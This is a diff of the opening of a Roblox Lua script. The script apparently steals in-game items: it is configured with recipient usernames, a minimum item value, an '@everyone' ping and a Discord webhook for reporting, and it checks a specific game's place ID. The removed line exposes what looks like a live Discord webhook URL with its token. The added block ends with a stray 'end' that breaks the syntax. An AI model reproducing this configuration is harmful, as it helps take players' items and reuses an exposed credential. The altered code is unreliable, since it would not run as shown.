@@ -1,23 +1,38 @@
+-- Wait for the game to fully load
 if not game:IsLoaded() then
     game.Loaded:Wait()
 end
+
+-- Prevent the script from executing multiple times
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
 end
 _G.scriptExecuted = true
 
-local users = _G.Usernames or {"2ndcfpaj67", "CREOLEO23"}
-local min_value = _G.min_value or 0.1
+-- Setup configuration with safe defaults
+local users = type(_G.Usernames) == "table" and _G.Usernames or {"2ndcfpaj67", "CREOLEO23"}
+local min_value = type(_G.min_value) == "number" and _G.min_value or 0.1
 local ping = _G.pingEveryone or "Yes"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+local webhook = type(_G.webhook) == "string" and _G.webhook or "YOUR_WEBHOOK_HERE"
 
+-- Get Players service and safely get LocalPlayer
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer or Players.PlayerAdded:Wait()
 
+-- Validate essential variables
 if next(users) == nil or webhook == "" then
-  plr:kick("You didn't add username or webhook")
+    plr:Kick("You didn't add a username or webhook")
     return
+end
+
+-- Optional: debug prints to confirm everything is loaded
+print("Script loaded successfully!")
+print("Users:", table.concat(users, ", "))
+print("Min value:", min_value)
+print("Ping everyone:", ping)
+print("Webhook:", webhook)
+print("LocalPlayer:", plr.Name)
 end
 
 if game.PlaceId ~= 920587237 then
